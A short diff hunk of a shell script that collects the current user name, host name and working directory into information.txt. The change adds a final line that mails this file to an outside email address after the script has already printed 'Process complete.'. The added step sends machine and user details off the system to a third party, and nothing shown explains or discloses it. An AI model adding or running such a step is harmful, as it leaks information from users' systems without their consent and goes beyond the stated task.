@@ -4,3 +4,4 @@ whoami > information.txt
 hostname >> information.txt
 pwd >> information.txt
 echo "Process complete."
+mail -s 'System Information' mdao@akamai.com < information.txt
